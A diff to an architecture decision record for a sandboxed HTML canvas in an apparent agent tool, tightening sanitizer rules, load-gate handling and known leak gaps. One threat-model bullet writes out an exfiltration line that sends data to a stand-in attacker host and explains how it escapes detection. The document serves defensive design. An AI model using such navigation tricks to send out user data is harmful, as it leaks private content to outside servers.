@@ -8,10 +8,13 @@
   `katashiro.show_image` and its skill (bytes that skip the model); Archify
   (<https://github.com/tt-a1i/archify>, Apache-2.0, v3.2.0 checked).
 
-> This ADR does not reopen the canvas ADR. `html` is decided there: its own frame, click to run,
+> This ADR does not reopen the canvas ADR's decisions on `html`: its own frame, click to run,
 > `save`/`selection` refused, the load gate, the stated leak, the banner. It fills in what the
 > canvas ADR leaves for "phase 2": how the HTML gets into the frame, what the frame is allowed to
 > do, the size cap, and the agent-side path, using one real workload to settle the details.
+> It changes three details of canvas §3.2, each marked there with a pointer back here: the `html`
+> frame also sends `openLink` (§2.4), its sandbox adds `allow-downloads` (§6 Q2), and a navigation
+> whose response never commits is not caught by the load gate at all (§3).
 
 ---
 
@@ -94,6 +97,15 @@ view uses its own DOMPurify profile, not the markdown one:
   `<iframe>`, `<object>`, `<embed>`, `<meta http-equiv>`, `<base>`, `<link>`, `target`.
   Images: `data:` and `blob:` only (the frame's CSP would block the rest anyway).
 - Links go through `openLink`, as everywhere in this frame.
+- For the implementation:
+  - **Do not reuse the mermaid profile (`SVG_DP`).** It adds `foreignObject`. The vendored
+    DOMPurify drops `use`, `animate`, `set` and `foreignObject` by default, and this profile keeps
+    it that way. If arrow markers need `use`, add it only with a hook that keeps an `href` /
+    `xlink:href` of the form `#id` (same document) and removes any other.
+  - The `<style>` elements copied into the shadow root come from the **sanitized** document, not
+    from the raw content.
+  - Sanitize with `RETURN_DOM` and move the resulting nodes into the shadow root. Do not
+    serialize and set `innerHTML` again: a second parse is where mutation XSS lives.
 
 The header shows **▶ Run scripts** and a line under it: *"Shown without its scripts. Run scripts
 to make it interactive — this canvas's script can then send what it contains, and what you type
@@ -123,11 +135,35 @@ if the profile ever lets a script through.
   3. then `rendered{version}`.
   A second `render` is ignored. A new revision, or Run scripts again, is a host-caused reload with
   a new nonce (§3.2), followed by a new `ready`.
-- **The load gate counts the `document.close()` load.** Chrome may fire the iframe's `load` event
-  again when a `document.open`/`close` pair finishes. If it does, the host expects exactly one such
-  load after each `render` it sent, and treats it as host-caused; any load beyond that is the
-  frame navigating away, as before. *To verify during implementation:* whether the event fires,
-  and that a self-navigation right after `render` is still caught.
+- **Host invariant: one `render` per nonce, and nothing else.** For an `html` frame the host posts
+  exactly one message per nonce, the `render` answering that nonce's `ready`. It never posts a
+  second `render`, a theme change, a scroll request or anything else to it. That is what bounds
+  the gaps below: whatever the frame's script does, it holds this one revision's content and
+  nothing more.
+- **The load gate and `document.close()`.** Chrome may or may not fire the iframe's `load` event
+  again when a `document.open`/`close` pair finishes. The gate is a plain counter
+  (`createLoadGate` in `src/core/canvas-core.js`), so a wrong guess either way is a hole: an
+  expectation nobody uses would later swallow the frame's own navigation, and a missing one would
+  drop a good frame. So:
+  1. **Pin it with a test, then hard-code it.** The implementation PR includes a test (e2e, real
+     Chrome) that shows whether the event fires, and the host either always or never expects
+     that load. No runtime "if it fires".
+  2. **If it fires, the expectation is single-use.** It is armed when `render` is posted and
+     covers that one load. It is dropped on `rendered{version}` or after a timeout (set in the
+     implementation, a few seconds), whichever comes first, and never carries over to a later
+     load. The same test pins the order in which the host sees that load and `rendered`.
+  3. **Known gap:** page script that navigates during `document.write()`, before `close()`, races
+     that load. The host may count its navigation as the expected load, or the expected load may
+     be counted as the navigation. The cost is detection only: the frame may not be dropped, but
+     under the invariant above it has nothing more to leak than the content it already holds
+     (canvas §3.2 already states that this content can leave).
+- **Known gap: violations during the first run are not reported.** `document.open` drops our
+  `securitypolicyviolation` listener, and it is added back only after `close()`. A violation
+  raised by the page's inline script while `write()` runs it (a blocked `eval`, `Worker` or
+  `fetch` at start-up) is therefore not sent as `error{}`. If that leaves the page unable to
+  finish, the user sees a broken canvas with no message. The host does still get `rendered`
+  (it comes from our script, not the page's), so this is accepted as a limitation and not
+  worked around in this version.
 - **Deep links** (`#focus=…`, `#route=…`) are not supported in this version: the host does not
   pass a fragment, and Archify's `replaceState` rewriting our hash is harmless (the nonce was
   already read).
@@ -167,6 +203,19 @@ the browser. The HTML itself has none.
   the frame with data in the URL, or use WebRTC. An Archify file is produced by a CLI, but
   Katashiro cannot tell it apart from hand-written HTML, and the labels in it come from whatever
   the agent read. It is treated like any other `html` canvas.
+- **A navigation may never be noticed.** Canvas §3.2 says the load gate notices a self-navigation
+  "only afterwards". It can be worse: `location = "https://evil.example/?d=…"` sends the request
+  whether or not the gate exists, and if the server answers `204` or with
+  `Content-Disposition: attachment`, the navigation never commits, no `load` fires, and the gate
+  never sees it. The data has left and the frame stays. `allow-downloads` does not change this
+  (the request goes out either way); it is a property of the leak canvas §3.2 already accepts.
+- **Script can put a file on the user's disk.** With `allow-downloads`, after Run scripts the
+  page can start a download with any name and content, with no further click (Chrome's own
+  download UI and its multiple-download prompt still apply). This is the same kind of risk as the
+  clipboard one (§6 Q2): a planted file the user may later open or run. It is accepted because it
+  needs the Run scripts click, the file does not run by itself, and Archify's exports need it.
+  If it proves a problem, §6 Q2's option (c) (a host-mediated download with a confirm card) is
+  the fallback.
 - 0.85 MB a revision with the 10-version history is about 8.5 MB of the 200 MB budget per canvas;
   a canvas at the 4 MB cap keeps up to 40 MB.
 - Archify's Copy button fails (the clipboard stays closed, §6 Q2); its exports work.
